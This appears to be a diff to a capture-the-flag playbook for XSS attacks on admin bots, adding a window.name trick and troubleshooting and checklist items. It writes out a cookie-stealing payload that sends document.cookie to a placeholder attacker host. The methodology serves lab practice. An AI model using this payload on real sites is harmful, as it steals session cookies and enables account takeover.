@@ -116,6 +116,14 @@ Preferred order:
 
 Use a disposable webhook/collaborator outside reusable notes.
 
+If filters block normal concat or URL-building syntax, test whether a tiny attacker page plus `window.name` can reduce the payload to:
+
+```text
+";name=document.cookie;location='//[attacker-host]'//
+```
+
+Then let the attacker page convert `window.name` into a server-side log request.
+
 Record:
 
 ```text
@@ -132,6 +140,9 @@ Determine whether failure is due to:
 - CSP blocking inline script
 - bot timeout
 - malformed report URL
+- `postMessage` validation using string coercion while the sink reuses a non-string object
+- `window.name` not surviving navigation in the real bot runtime
+- attacker host propagation/cache issues returning stale content or `404`
 
 If cookies are HttpOnly, pivot to in-browser fetch of admin-only routes.
 
@@ -169,5 +180,7 @@ Sensitive cookie was readable from JavaScript.
 - [ ] Same-origin XSS URL built.
 - [ ] Admin bot triggered successfully.
 - [ ] Sensitive data exfiltrated with minimal proof.
+- [ ] If using helper infrastructure, the attacker host was fresh and confirmed live before submission.
+- [ ] If the target uses `postMessage`, object/array overload confusion was tested in addition to plain-string origin spoofing.
 - [ ] Root cause and impact documented.
 - [ ] Reusable notes exclude live secrets, tokens, and flags.
